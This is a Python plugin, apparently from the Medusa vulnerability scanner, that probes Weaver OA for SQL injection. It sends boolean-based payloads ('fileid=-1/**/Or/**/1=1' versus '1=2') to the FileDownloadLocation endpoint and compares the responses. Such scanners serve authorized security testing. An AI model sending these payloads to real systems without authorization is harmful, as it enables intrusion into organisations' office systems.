#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urllib.parse
import requests
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['algroup'] = "Weaver_sqli"  # 插件名称
        self.info['name'] ='泛微OASQL注入漏洞' #漏洞名称
        self.info['affects'] = "泛微OA"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payload="/weaver/weaver.email.FileDownloadLocation?download=1&fileid=-1/**/Or/**/1=1"
payload2="/weaver/weaver.email.FileDownloadLocation?download=1&fileid=-1/**/Or/**/1=2"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload_url = scheme+"://"+url+payload
        payload_url2 = scheme + "://" + url + ':' + str(port)+ payload2
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        # if ProxyIp!=None:
        #     proxies = {
        #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
        #         "http": "http://" + str(ProxyIp)
        #     }
        #     resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        #     resp2 = requests.get(payload_url2, headers=headers, proxies=proxies, timeout=5, verify=False)
        # elif ProxyIp==None:
        resp = requests.get(payload_url, headers=headers, timeout=5, verify=False)
        resp2 = requests.get(payload_url2, headers=headers, timeout=5, verify=False)
        if r"attachment" in str(resp.headers) and r"attachment" not in str(resp2.headers):
            Medusa = "{} 存在泛微OASQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            _t = VulnerabilityInfo(Medusa)
            web = ClassCongregation.VulnerabilityDetails(_t.info)
            web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            return (str(_t.info))
    except:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类